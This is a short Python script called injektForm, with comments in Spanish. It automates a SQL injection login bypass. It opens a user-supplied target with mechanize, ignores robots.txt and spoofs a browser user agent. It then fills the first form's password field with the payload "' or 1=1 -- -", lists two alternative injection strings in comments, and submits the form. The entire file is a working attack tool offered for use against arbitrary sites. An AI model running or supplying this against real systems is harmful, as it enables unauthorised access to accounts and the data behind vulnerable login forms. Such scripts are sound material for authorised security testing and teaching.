#!/usr/bin/python3

import mechanize, argparse

# injektForm v2.0, Author @guguvk (Axel González)

try:
    parser = argparse.ArgumentParser(description="Este es un inyeccion de formulario")
    parser.add_argument("-t", "--target", help="Target to analyze", required=True)
    args = parser.parse_args()

    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.set_handle_equiv(False)

    br.open(args.target)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    br.select_form(nr=0) #debes especificar el formulario al cual se le hara la inyeccion, por defecto esta el principal
    br['password'] = "' or 1=1 -- -"
    #"' or '1'='1"
    #"\' or\'\'=\'"
    res = br.submit()
    print("\n" + str(res.read().decode()))

except mechanize._mechanize.BrowserStateError as e:
    print("\n!!Error:", e)

except mechanize.URLError as e:
    print("\n!!Error:", e)

except Exception as e:
    print("\n!!Error inesperado:", e)

